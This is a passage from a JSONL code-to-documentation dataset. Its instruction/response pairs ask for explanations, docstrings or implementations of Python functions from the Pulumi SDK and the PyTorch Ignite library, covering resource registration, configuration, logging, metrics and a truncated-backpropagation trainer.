deleteBeforeReplace=opts.delete_before_replace,\n                ignoreChanges=ignore_changes,\n                version=opts.version or \"\",\n            )\n\n            def do_rpc_call():\n                if monitor:\n                    # If there is a monitor available, make the true RPC request to the engine.\n                    try:\n                        return monitor.RegisterResource(req)\n                    except grpc.RpcError as exn:\n                        # See the comment on invoke for the justification for disabling\n                        # this warning\n                        # pylint: disable=no-member\n                        if exn.code() == grpc.StatusCode.UNAVAILABLE:\n                            sys.exit(0)\n\n                        details = exn.details()\n                    raise Exception(details)\n                else:\n                    # If no monitor is available, we'll need to fake up a response, for testing.\n                    return RegisterResponse(create_test_urn(ty, name), None, resolver.serialized_props)\n\n            resp = await asyncio.get_event_loop().run_in_executor(None, do_rpc_call)\n        except Exception as exn:\n            log.debug(f\"exception when preparing or executing rpc: {traceback.format_exc()}\")\n            rpc.resolve_outputs_due_to_exception(resolvers, exn)\n            resolve_urn_exn(exn)\n            if resolve_id is not None:\n                resolve_id(None, False, exn)\n            raise\n\n        log.debug(f\"resource registration successful: ty={ty}, urn={resp.urn}\")\n        resolve_urn(resp.urn)\n        if resolve_id:\n            # The ID is known if (and only if) it is a non-empty string. If it's either None or an empty string,\n            # we should treat it as unknown. TFBridge in particular is known to send the empty string as an ID when\n            # doing a preview.\n            is_known = bool(resp.id)\n            resolve_id(resp.id, is_known, None)\n\n        await rpc.resolve_outputs(res, props, resp.object, resolvers)\n\n    asyncio.ensure_future(RPC_MANAGER.do_rpc(\"register resource\", do_register)())", "response": "Register a new resource object with the given type t and name."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef configure(settings: Settings):\n    if not settings or not isinstance(settings, Settings):\n        raise TypeError('Settings is expected to be non-None and of type Settings')\n    global SETTINGS  # pylint: disable=global-statement\n    SETTINGS = settings", "response": "Configure the current ambient settings bag to the one given."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_project() -> Optional[str]:\n    project = SETTINGS.project\n    if not project:\n        require_test_mode_enabled()\n        raise RunError('Missing project name; for test mode, please set PULUMI_NODEJS_PROJECT')\n    return project", "response": "Returns the current project name."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_stack() -> Optional[str]:\n    stack = SETTINGS.stack\n    if not stack:\n        require_test_mode_enabled()\n        raise RunError('Missing stack name; for test mode, please set PULUMI_NODEJS_STACK')\n    return stack", "response": "Returns the current stack name."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the current resource monitoring service client for RPC communications.", "response": "def get_monitor() -> Optional[resource_pb2_grpc.ResourceMonitorStub]:\n    \"\"\"\n    Returns the current resource monitoring service client for RPC communications.\n    \"\"\"\n    monitor = SETTINGS.monitor\n    if not monitor:\n        require_test_mode_enabled()\n    return monitor"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nserializing the properties of the input bag into a Protobuf structure.", "response": "async def serialize_properties(inputs: 'Inputs',\n                               property_deps: Dict[str, List['Resource']],\n                               input_transformer: Optional[Callable[[str], str]] = None) -> struct_pb2.Struct:\n    \"\"\"\n    Serializes an arbitrary Input bag into a Protobuf structure, keeping track of the list\n    of dependent resources in the `deps` list. Serializing properties is inherently async\n    because it awaits any futures that are contained transitively within the input bag.\n    \"\"\"\n    struct = struct_pb2.Struct()\n    for k, v in inputs.items():\n        deps = []\n        result = await serialize_property(v, deps, input_transformer)\n        # We treat properties that serialize to None as if they don't exist.\n        if result is not None:\n            # While serializing to a pb struct, we must \"translate\" all key names to be what the engine is going to\n            # expect. Resources provide the \"transform\" function for doing this.\n            translated_name = k\n            if input_transformer is not None:\n                translated_name = input_transformer(k)\n                log.debug(f\"top-level input property translated: {k} -> {translated_name}\")\n            # pylint: disable=unsupported-assignment-operation\n            struct[translated_name] = result\n            property_deps[translated_name] = deps\n\n    return struct"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def serialize_property(value: 'Input[Any]',\n                             deps: List['Resource'],\n                             input_transformer: Optional[Callable[[str], str]] = None) -> Any:\n    \"\"\"\n    Serializes a single Input into a form suitable for remoting to the engine, awaiting\n    any futures required to do so.\n    \"\"\"\n    if isinstance(value, list):\n        props = []\n        for elem in value:\n            props.append(await serialize_property(elem, deps, input_transformer))\n\n        return props\n\n    if known_types.is_custom_resource(value):\n        deps.append(value)\n        return await serialize_property(value.id, deps, input_transformer)\n\n    if known_types.is_asset(value):\n        # Serializing an asset requires the use of a magical signature key, since otherwise it would look\n        # like any old weakly typed object/map when received by the other side of the RPC boundary.\n        obj = {\n            _special_sig_key: _special_asset_sig\n        }\n\n        if hasattr(value, \"path\"):\n            obj[\"path\"] = await serialize_property(value.path, deps, input_transformer)\n        elif hasattr(value, \"text\"):\n            obj[\"text\"] = await serialize_property(value.text, deps, input_transformer)\n        elif hasattr(value, \"uri\"):\n            obj[\"uri\"] = await serialize_property(value.uri, deps, input_transformer)\n        else:\n            raise AssertionError(f\"unknown asset type: {value}\")\n\n        return obj\n\n    if known_types.is_archive(value):\n        # Serializing an archive requires the use of a magical signature key, since otherwise it would look\n        # like any old weakly typed object/map when received by the other side of the RPC boundary.\n        obj = {\n            _special_sig_key: _special_archive_sig\n        }\n\n        if hasattr(value, \"assets\"):\n            obj[\"assets\"] = await serialize_property(value.assets, deps, input_transformer)\n        elif hasattr(value, \"path\"):\n            obj[\"path\"] = await serialize_property(value.path, deps, input_transformer)\n        elif hasattr(value, \"uri\"):\n            obj[\"uri\"] = await serialize_property(value.uri, deps, input_transformer)\n        else:\n            raise AssertionError(f\"unknown archive type: {value}\")\n\n        return obj\n\n    if inspect.isawaitable(value):\n        # Coroutines and Futures are both awaitable. Coroutines need to be scheduled.\n        # asyncio.ensure_future returns futures verbatim while converting coroutines into\n        # futures by arranging for the execution on the event loop.\n        #\n        # The returned future can then be awaited to yield a value, which we'll continue\n        # serializing.\n        future_return = await asyncio.ensure_future(value)\n        return await serialize_property(future_return, deps, input_transformer)\n\n    if known_types.is_output(value):\n        deps.extend(value.resources())\n\n        # When serializing an Output, we will either serialize it as its resolved value or the \"unknown value\"\n        # sentinel. We will do the former for all outputs created directly by user code (such outputs always\n        # resolve isKnown to true) and for any resource outputs that were resolved with known values.\n        is_known = await value._is_known\n        value = await serialize_property(value.future(), deps, input_transformer)\n        return value if is_known else UNKNOWN\n\n    if isinstance(value, dict):\n        obj = {}\n        for k, v in value.items():\n            transformed_key = k\n            if input_transformer is not None:\n                transformed_key = input_transformer(k)\n                log.debug(f\"transforming input property: {k} -> {transformed_key}\")\n            obj[transformed_key] = await serialize_property(v, deps, input_transformer)\n\n        return obj\n\n    return value", "response": "Serializes a single Input into a form suitable for remoting to the engine awaiting any futures required to do so."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef deserialize_property(value: Any) -> Any:\n    if value == UNKNOWN:\n        return None\n\n    # ListValues are projected to lists\n    if isinstance(value, struct_pb2.ListValue):\n        return [deserialize_property(v) for v in value]\n\n    # Structs are projected to dictionaries\n    if isinstance(value, struct_pb2.Struct):\n        return deserialize_properties(value)\n\n    # Everything else is identity projected.\n    return value", "response": "Deserializes a single protobuf value into idiomatic\n    Python values."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef translate_output_properties(res: 'Resource', output: Any) -> Any:\n    if isinstance(output, dict):\n        return {res.translate_output_property(k): translate_output_properties(res, v) for k, v in output.items()}\n\n    if isinstance(output, list):\n        return [translate_output_properties(res, v) for v in output]\n\n    return output", "response": "Recursively rewrite keys of objects returned by the engine to conform with a naming\n    convention specified by the resource s implementation of translate_output_property."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef resolve_outputs_due_to_exception(resolvers: Dict[str, Resolver], exn: Exception):\n    for key, resolve in resolvers.items():\n        log.debug(f\"sending exception to resolver for {key}\")\n        resolve(None, False, exn)", "response": "Resolves all outputs with resolvers exceptionally using the given exception as the reason why the resolver has failed to resolve."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning an optional configuration value by its key or None if it doesn t exist.", "response": "def get(self, key: str) -> Optional[str]:\n        \"\"\"\n        Returns an optional configuration value by its key, or None if it doesn't exist.\n\n        :param str key: The requested configuration key.\n        :return: The configuration key's value, or None if one does not exist.\n        :rtype: Optional[str]\n        \"\"\"\n        return get_config(self.full_key(key))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_bool(self, key: str) -> Optional[bool]:\n        v = self.get(key)\n        if v is None:\n            return None\n        if v in ['true', 'True']:\n            return True\n        if v in ['false', 'False']:\n            return False\n        raise ConfigTypeError(self.full_key(key), v, 'bool')", "response": "Returns an optional configuration value as a bool by its key or None if it doesn t exist."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_int(self, key: str) -> Optional[int]:\n        v = self.get(key)\n        if v is None:\n            return None\n        try:\n            return int(v)\n        except:\n            raise ConfigTypeError(self.full_key(key), v, 'int')", "response": "Returns an optional configuration value as an int by its key."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_float(self, key: str) -> Optional[float]:\n        v = self.get(key)\n        if v is None:\n            return None\n        try:\n            return float(v)\n        except:\n            raise ConfigTypeError(self.full_key(key), v, 'float')", "response": "Returns an optional configuration value as a float by its key."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef require(self, key: str) -> str:\n        v = self.get(key)\n        if v is None:\n            raise ConfigMissingError(self.full_key(key))\n        return v", "response": "Returns a configuration value by its given key."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef require_bool(self, key: str) -> bool:\n        v = self.get_bool(key)\n        if v is None:\n            raise ConfigMissingError(self.full_key(key))\n        return v", "response": "Returns a configuration value as a legal bool by its given key."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef require_int(self, key: str) -> int:\n        v = self.get_int(key)\n        if v is None:\n            raise ConfigMissingError(self.full_key(key))\n        return v", "response": "Returns a configuration value as an int by its given key."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef require_float(self, key: str) -> float:\n        v = self.get_float(key)\n        if v is None:\n            raise ConfigMissingError(self.full_key(key))\n        return v", "response": "Returns a configuration value as a float by its given key."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef archive(class_obj: type) -> type:\n    assert isinstance(class_obj, type), \"class_obj is not a Class\"\n    global _archive_resource_type\n    _archive_resource_type = class_obj\n    return class_obj", "response": "Decorator to annotate the Archive class. Registers the decorated class\n    as the Archive known type."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef remote_archive(class_obj: type) -> type:\n    assert isinstance(class_obj, type), \"class_obj is not a Class\"\n    global _remote_archive_resource_type\n    _remote_archive_resource_type = class_obj\n    return class_obj", "response": "Decorator to annotate the RemoteArchive class. Registers the decorated class\n    as the RemoteArchive known type."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef custom_resource(class_obj: type) -> type:\n    assert isinstance(class_obj, type), \"class_obj is not a Class\"\n    global _custom_resource_type\n    _custom_resource_type = class_obj\n    return class_obj", "response": "Decorator to annotate the CustomResource class. Registers the decorated class\n    as the CustomResource known type."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef debug(msg: str, resource: Optional['Resource'] = None, stream_id: Optional[int] = None) -> None:\n    engine = get_engine()\n    if engine is not None:\n        _log(engine, engine_pb2.DEBUG, msg, resource, stream_id)\n    else:\n        print(\"debug: \" + msg, file=sys.stderr)", "response": "Logs a message to the Pulumi CLI s debug channel associating it with a resource and stream_id."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef info(msg: str, resource: Optional['Resource'] = None, stream_id: Optional[int] = None) -> None:\n    engine = get_engine()\n    if engine is not None:\n        _log(engine, engine_pb2.INFO, msg, resource, stream_id)\n    else:\n        print(\"info: \" + msg, file=sys.stderr)", "response": "Logs a message to the Pulumi CLI s info channel associating it with a resource and stream_id."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nlogs a message to the Pulumi CLI s warning channel associating it with a resource and stream_id.", "response": "def warn(msg: str, resource: Optional['Resource'] = None, stream_id: Optional[int] = None) -> None:\n    \"\"\"\n    Logs a message to the Pulumi CLI's warning channel, associating it with a resource\n    and stream_id if provided.\n\n    :param str msg: The message to send to the Pulumi CLI.\n    :param Optional[Resource] resource: If provided, associate this message with the given resource in the Pulumi CLI.\n    :param Optional[int] stream_id: If provided, associate this message with a stream of other messages.\n    \"\"\"\n    engine = get_engine()\n    if engine is not None:\n        _log(engine, engine_pb2.WARNING, msg, resource, stream_id)\n    else:\n        print(\"warning: \" + msg, file=sys.stderr)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef error(msg: str, resource: Optional['Resource'] = None, stream_id: Optional[int] = None):\n    engine = get_engine()\n    if engine is not None:\n        _log(engine, engine_pb2.ERROR, msg, resource, stream_id)\n    else:\n        print(\"error: \" + msg, file=sys.stderr)", "response": "Logs a message to the Pulumi CLI s error channel."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_config_env() -> Dict[str, Any]:\n    if 'PULUMI_CONFIG' in os.environ:\n        env_config = os.environ['PULUMI_CONFIG']\n        return json.loads(env_config)\n    return dict()", "response": "Returns the environment map that will be used for config checking when variables aren t set."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_config_env_key(k: str) -> str:\n    env_key = ''\n    for c in k:\n        if c == '_' or 'A' <= c <= 'Z' or '0' <= c <= '9':\n            env_key += c\n        elif 'a' <= c <= 'z':\n            env_key += c.upper()\n        else:\n            env_key += '_'\n    return 'PULUMI_CONFIG_%s' % env_key", "response": "Returns a scrubbed environment variable key PULUMI_CONFIG_<k > that can be used for the explicit varaibles."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a configuration variable s value or None if it is unset.", "response": "def get_config(k: str) -> Any:\n    \"\"\"\n    Returns a configuration variable's value or None if it is unset.\n    \"\"\"\n    # If the config has been set explicitly, use it.\n    if k in list(CONFIG.keys()):\n        return CONFIG[k]\n\n    # If there is a specific PULUMI_CONFIG_<k> environment variable, use it.\n    env_key = get_config_env_key(k)\n    if env_key in os.environ:\n        return os.environ[env_key]\n\n    # If the config hasn't been set, but there is a process-wide PULUMI_CONFIG environment variable, use it.\n    env_dict = get_config_env()\n    if env_dict is not None and k in list(env_dict.keys()):\n        return env_dict[k]\n\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nruns the given function inside of a new stack resource.", "response": "async def run_in_stack(func: Callable):\n    \"\"\"\n    Run the given function inside of a new stack resource.  This ensures that any stack export calls will end\n    up as output properties on the resulting stack component in the checkpoint file.  This is meant for internal\n    runtime use only and is used by the Python SDK entrypoint program.\n    \"\"\"\n    try:\n        Stack(func)\n\n        # If an exception occurred when doing an RPC, this await will propegate the exception\n        # to the main thread.\n        await RPC_MANAGER.unhandled_exeception()\n    finally:\n        log.debug(\"Waiting for outstanding RPCs to complete\")\n\n        # Pump the event loop, giving all of the RPCs that we just queued up time to fully execute.\n        # The asyncio scheduler does not expose a \"yield\" primitive, so this will have to do.\n        #\n        # Note that \"asyncio.sleep(0)\" is the blessed way to do this:\n        # https://github.com/python/asyncio/issues/284#issuecomment-154180935\n        await asyncio.sleep(0)\n\n        # Wait for all outstanding RPCs to retire.\n        await RPC_MANAGER.wait_for_outstanding_rpcs()\n\n        # Asyncio event loops require that all outstanding tasks be completed by the time that the event\n        # loop closes. If we're at this point and there are no outstanding RPCs, we should just cancel\n        # all outstanding tasks.\n        #\n        # We will occasionally start tasks deliberately that we know will never complete. We must cancel\n        # them before shutting down the event loop.\n        log.debug(\"Canceling all outstanding tasks\")\n        for task in asyncio.Task.all_tasks():\n            # Don't kill ourselves, that would be silly.\n            if task == asyncio.Task.current_task():\n                continue\n            task.cancel()\n\n        # Pump the event loop again. Task.cancel is delivered asynchronously to all running tasks\n        # and each task needs to get scheduled in order to acknowledge the cancel and exit.\n        await asyncio.sleep(0)\n\n        # Once we get scheduled again, all tasks have exited and we're good to go.\n        log.debug(\"run_in_stack completed\")"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef output(self, name: str, value: Any):\n        self.outputs[name] = value", "response": "Exports a stack output with a given name and value."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nexport a named stack output.", "response": "def export(name: str, value: Any):\n    \"\"\"\n    Exports a named stack output.\n\n    :param str name: The name to assign to this output.\n    :param Any value: The value of this output.\n    \"\"\"\n    stack = get_root_resource()\n    if stack is not None:\n        stack.output(name, value)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nretrieves the provider for the given module member.", "response": "def get_provider(self, module_member: str) -> Optional['ProviderResource']:\n        \"\"\"\n        Fetches the provider for the given module member, if this resource has been provided a specific\n        provider for the given module member.\n\n        Returns None if no provider was provided.\n\n        :param str module_member: The requested module member.\n        :return: The :class:`ProviderResource` associated with the given module member, or None if one does not exist.\n        :rtype: Optional[ProviderResource]\n        \"\"\"\n        components = module_member.split(\":\")\n        if len(components) != 3:\n            return None\n\n        [pkg, _, _] = components\n        return self._providers.get(pkg)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add_event_handler(self, event_name, handler, *args, **kwargs):\n        if event_name not in self._allowed_events:\n            self._logger.error(\"attempt to add event handler to an invalid event %s.\", event_name)\n            raise ValueError(\"Event {} is not a valid event for this Engine.\".format(event_name))\n\n        event_args = (Exception(), ) if event_name == Events.EXCEPTION_RAISED else ()\n        self._check_signature(handler, 'handler', *(event_args + args), **kwargs)\n\n        self._event_handlers[event_name].append((handler, args, kwargs))\n        self._logger.debug(\"added handler for event %s.\", event_name)", "response": "Add an event handler to be executed when the specified event is fired."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nchecks if the specified event has the specified handler.", "response": "def has_event_handler(self, handler, event_name=None):\n        \"\"\"Check if the specified event has the specified handler.\n\n        Args:\n            handler (callable): the callable event handler.\n            event_name: The event the handler attached to. Set this\n                to ``None`` to search all events.\n        \"\"\"\n        if event_name is not None:\n            if event_name not in self._event_handlers:\n                return False\n            events = [event_name]\n        else:\n            events = self._event_handlers\n        for e in events:\n            for h, _, _ in self._event_handlers[e]:\n                if h == handler:\n                    return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nremove the given event handler from the list of event handlers that are attached to the given event.", "response": "def remove_event_handler(self, handler, event_name):\n        \"\"\"Remove event handler `handler` from registered handlers of the engine\n\n        Args:\n            handler (callable): the callable event handler that should be removed\n            event_name: The event the handler attached to.\n\n        \"\"\"\n        if event_name not in self._event_handlers:\n            raise ValueError(\"Input event name '{}' does not exist\".format(event_name))\n\n        new_event_handlers = [(h, args, kwargs) for h, args, kwargs in self._event_handlers[event_name]\n                              if h != handler]\n        if len(new_event_handlers) == len(self._event_handlers[event_name]):\n            raise ValueError(\"Input handler '{}' is not found among registered event handlers\".format(handler))\n        self._event_handlers[event_name] = new_event_handlers"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nexecutes all the handlers associated with the event_name.", "response": "def _fire_event(self, event_name, *event_args, **event_kwargs):\n        \"\"\"Execute all the handlers associated with given event.\n\n        This method executes all handlers associated with the event\n        `event_name`. Optional positional and keyword arguments can be used to\n        pass arguments to **all** handlers added with this event. These\n        aguments updates arguments passed using :meth:`~ignite.engine.Engine.add_event_handler`.\n\n        Args:\n            event_name: event for which the handlers should be executed. Valid\n                events are from :class:`~ignite.engine.Events` or any `event_name` added by\n                :meth:`~ignite.engine.Engine.register_events`.\n            *event_args: optional args to be passed to all handlers.\n            **event_kwargs: optional keyword args to be passed to all handlers.\n\n        \"\"\"\n        if event_name in self._allowed_events:\n            self._logger.debug(\"firing handlers for event %s \", event_name)\n            for func, args, kwargs in self._event_handlers[event_name]:\n                kwargs.update(event_kwargs)\n                func(self, *(event_args + args), **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef run(self, data, max_epochs=1):\n\n        self.state = State(dataloader=data, epoch=0, max_epochs=max_epochs, metrics={})\n\n        try:\n            self._logger.info(\"Engine run starting with max_epochs={}.\".format(max_epochs))\n            start_time = time.time()\n            self._fire_event(Events.STARTED)\n            while self.state.epoch < max_epochs and not self.should_terminate:\n                self.state.epoch += 1\n                self._fire_event(Events.EPOCH_STARTED)\n                hours, mins, secs = self._run_once_on_dataset()\n                self._logger.info(\"Epoch[%s] Complete. Time taken: %02d:%02d:%02d\", self.state.epoch, hours, mins, secs)\n                if self.should_terminate:\n                    break\n                self._fire_event(Events.EPOCH_COMPLETED)\n\n            self._fire_event(Events.COMPLETED)\n            time_taken = time.time() - start_time\n            hours, mins, secs = _to_hours_mins_secs(time_taken)\n            self._logger.info(\"Engine run complete. Time taken %02d:%02d:%02d\" % (hours, mins, secs))\n\n        except BaseException as e:\n            self._logger.error(\"Engine run is terminating due to exception: %s.\", str(e))\n            self._handle_exception(e)\n\n        return self.state", "response": "Runs the process_function over the passed data."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncalculate Intersection over Union containing IoU.", "response": "def IoU(cm, ignore_index=None):\n    \"\"\"Calculates Intersection over Union\n\n    Args:\n        cm (ConfusionMatrix): instance of confusion matrix metric\n        ignore_index (int, optional): index to ignore, e.g. background index\n\n    Returns:\n        MetricsLambda\n\n    Examples:\n\n    .. code-block:: python\n\n        train_evaluator = ...\n\n        cm = ConfusionMatrix(num_classes=num_classes)\n        IoU(cm, ignore_index=0).attach(train_evaluator, 'IoU')\n\n        state = train_evaluator.run(train_dataset)\n        # state.metrics['IoU'] -> tensor of shape (num_classes - 1, )\n\n    \"\"\"\n    if not isinstance(cm, ConfusionMatrix):\n        raise TypeError(\"Argument cm should be instance of ConfusionMatrix, but given {}\".format(type(cm)))\n\n    if ignore_index is not None:\n        if not (isinstance(ignore_index, numbers.Integral) and 0 <= ignore_index < cm.num_classes):\n            raise ValueError(\"ignore_index should be non-negative integer, but given {}\".format(ignore_index))\n\n    # Increase floating point precision\n    cm = cm.type(torch.float64)\n    iou = cm.diag() / (cm.sum(dim=1) + cm.sum(dim=0) - cm.diag() + 1e-15)\n    if ignore_index is not None:\n\n        def ignore_index_fn(iou_vector):\n            if ignore_index >= len(iou_vector):\n                raise ValueError(\"ignore_index {} is larger than the length of IoU vector {}\"\n                                 .format(ignore_index, len(iou_vector)))\n            indices = list(range(len(iou_vector)))\n            indices.remove(ignore_index)\n            return iou_vector[indices]\n\n        return MetricsLambda(ignore_index_fn, iou)\n    else:\n        return iou"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef cmAccuracy(cm):\n    # Increase floating point precision\n    cm = cm.type(torch.float64)\n    return cm.diag().sum() / (cm.sum() + 1e-15)", "response": "Calculates the accuracy using a confusion matrix metric."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncalculates the precision of a confusion matrix using a floating point precision.", "response": "def cmPrecision(cm, average=True):\n    \"\"\"\n    Calculates precision using :class:`~ignite.metrics.ConfusionMatrix` metric.\n    Args:\n        cm (ConfusionMatrix): instance of confusion matrix metric\n        average (bool, optional): if True metric value is averaged over all classes\n    Returns:\n        MetricsLambda\n    \"\"\"\n\n    # Increase floating point precision\n    cm = cm.type(torch.float64)\n    precision = cm.diag() / (cm.sum(dim=0) + 1e-15)\n    if average:\n        return precision.mean()\n    return precision"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef cmRecall(cm, average=True):\n\n    # Increase floating point precision\n    cm = cm.type(torch.float64)\n    recall = cm.diag() / (cm.sum(dim=1) + 1e-15)\n    if average:\n        return recall.mean()\n    return recall", "response": "Calculates recall using confusion matrix metric."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nmoving tensors to relevant device.", "response": "def convert_tensor(input_, device=None, non_blocking=False):\n    \"\"\"Move tensors to relevant device.\"\"\"\n    def _func(tensor):\n        return tensor.to(device=device, non_blocking=non_blocking) if device else tensor\n\n    return apply_to_tensor(input_, _func)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef apply_to_type(input_, input_type, func):\n    if isinstance(input_, input_type):\n        return func(input_)\n    elif isinstance(input_, string_classes):\n        return input_\n    elif isinstance(input_, collections.Mapping):\n        return {k: apply_to_type(sample, input_type, func) for k, sample in input_.items()}\n    elif isinstance(input_, collections.Sequence):\n        return [apply_to_type(sample, input_type, func) for sample in input_]\n    else:\n        raise TypeError((\"input must contain {}, dicts or lists; found {}\"\n                         .format(input_type, type(input_))))", "response": "Apply a function on a object of input_type or mapping or sequence of objects of input_type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert a tensor of indices of any shape ( N num_classes... ) to a tensor of one - hot indicators of shape num_classes.", "response": "def to_onehot(indices, num_classes):\n    \"\"\"Convert a tensor of indices of any shape `(N, ...)` to a\n    tensor of one-hot indicators of shape `(N, num_classes, ...)`.\n    \"\"\"\n    onehot = torch.zeros(indices.shape[0], num_classes, *indices.shape[1:], device=indices.device)\n    return onehot.scatter_(1, indices.unsqueeze(1), 1)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef attach(self, engine, metric_names=None, output_transform=None,\n               event_name=Events.ITERATION_COMPLETED,\n               closing_event_name=Events.EPOCH_COMPLETED):\n        \"\"\"\n        Attaches the progress bar to an engine object.\n\n        Args:\n            engine (Engine): engine object.\n            metric_names (list, optional): list of the metrics names to log as the bar progresses\n            output_transform (callable, optional): a function to select what you want to print from the engine's\n                output. This function may return either a dictionary with entries in the format of ``{name: value}``,\n                or a single scalar, which will be displayed with the default name `output`.\n            event_name: event's name on which the progress bar advances. Valid events are from\n                :class:`~ignite.engine.Events`.\n            closing_event_name: event's name on which the progress bar is closed. Valid events are from\n                :class:`~ignite.engine.Events`.\n        \"\"\"\n        desc = self.tqdm_kwargs.get(\"desc\", \"Epoch\")\n\n        if not (event_name in Events and closing_event_name in Events):\n            raise ValueError(\"Logging and closing events should be only ignite.engine.Events\")\n\n        if not self._compare_lt(event_name, closing_event_name):\n            raise ValueError(\"Logging event {} should be called before closing event {}\"\n                             .format(event_name, closing_event_name))\n\n        log_handler = _OutputHandler(desc, metric_names, output_transform,\n                                     event_name=event_name,\n                                     closing_event_name=closing_event_name)\n        super(ProgressBar, self).attach(engine, log_handler, event_name)\n        engine.add_event_handler(closing_event_name, self._close)", "response": "Attaches the progress bar to an engine object."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_supervised_tbptt_trainer(\n    model,\n    optimizer,\n    loss_fn,\n    tbtt_step,\n    dim=0,\n    device=None,\n    non_blocking=False,\n    prepare_batch=_prepare_batch\n):\n    \"\"\"Create a trainer for truncated backprop through time supervised models.\n\n    Training recurrent model on long sequences is computationally intensive as\n    it requires to process the whole sequence before getting a gradient.\n    However, when the training loss is computed over many outputs\n    (`X to many <https://karpathy.github.io/2015/05/21/rnn-effectiveness/>`_),\n    there is an opportunity to compute a gradient over a subsequence. This is\n    known as\n    `truncated backpropagation through time <https://machinelearningmastery.com/\n    gentle-introduction-backpropagation-time/>`_.\n    This supervised trainer apply gradient optimization step every `tbtt_step`\n    time steps of the sequence, while backpropagating through the same\n    `tbtt_step` time steps.\n\n    Args:\n        model (`torch.nn.Module`): the model to train.\n        optimizer (`torch.optim.Optimizer`): the optimizer to use.\n        loss_fn (torch.nn loss function): the loss function to use.\n        tbtt_step (int): the length of time chunks (last one may be smaller).\n        dim (int): axis representing the time dimension.\n        device (str, optional): device type specification (default: None).\n            Applies to both model and batches.\n        non_blocking (bool, optional): if True and this copy is between CPU and GPU,\n            the copy may occur asynchronously with respect to the host. For other cases,\n            this argument has no effect.\n        prepare_batch (callable, optional): function that receives `batch`, `device`,\n            `non_blocking` and outputs tuple of tensors `(batch_x, batch_y)`.\n\n    Returns:\n        Engine: a trainer engine with supervised update function.\n\n    \"\"\"\n    if device:\n        model.to(device)\n\n    def _update(engine, batch):\n        loss_list = []\n        hidden = None\n\n        x, y = batch\n        for batch_t in zip(x.split(tbtt_step, dim=dim), y.split(tbtt_step, dim=dim)):\n            x_t, y_t = prepare_batch(batch_t, device=device, non_blocking=non_blocking)\n            # Fire event for start of iteration\n            engine.fire_event(Tbptt_Events.TIME_ITERATION_STARTED)\n            # Forward, backward and\n            model.train()\n            optimizer.zero_grad()\n            if hidden is None:\n                y_pred_t, hidden = model(x_t)\n            else:\n                hidden = _detach_hidden(hidden)\n                y_pred_t, hidden = model(x_t, hidden)\n            loss_t = loss_fn(y_pred_t, y_t)\n            loss_t.backward()\n            optimizer.step()\n\n            # Setting state of engine for consistent behaviour\n            engine.state.output = loss_t.item()\n            loss_list.append(loss_t.item())\n\n            # Fire event for end of iteration\n            engine.fire_event(Tbptt_Events.TIME_ITERATION_COMPLETED)\n\n        # return average loss over the time splits\n        return sum(loss_list) / len(loss_list)\n\n    engine = Engine(_update)\n    engine.register_events(*Tbptt_Events)\n    return engine", "response": "Create a supervised TBTT trainer for truncated backpropagation through time supervised models."}
